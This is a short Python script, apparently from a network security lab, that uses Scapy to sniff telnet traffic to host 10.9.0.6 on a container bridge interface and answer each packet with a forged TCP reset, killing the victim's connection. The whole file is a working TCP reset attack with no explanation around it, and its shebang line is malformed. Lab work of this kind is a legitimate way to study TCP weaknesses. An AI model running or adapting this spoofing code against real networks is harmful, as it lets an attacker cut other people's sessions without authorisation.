#!usr/bin/env python3
from scapy.all import *

iface = 'br-efe15936ac80'

def send_reset(pkt):
	"""
	Given a sniffed packet, send a rst packet with the correct information
	"""

	src_ip = pkt[IP].src
	dst_ip = pkt[IP].dst
	src_port = pkt[TCP].sport
	dst_port = pkt[TCP].dport
	ack = pkt[TCP].ack

	ip = IP(src=dst_ip, dst=src_ip)
	tcp = TCP(sport=dst_port, dport=src_port, flags="R", seq=ack)

	rst = ip/tcp
	send(rst, verbose=0, iface=iface)

def main():
	# Sniffing exchanged packets
	print('[👃 SNIFFING AND SENDING RST PACKETS]')
	pkt = sniff(iface=iface, filter='tcp port 23 and host 10.9.0.6', prn=send_reset)

if __name__ == '__main__':
	main()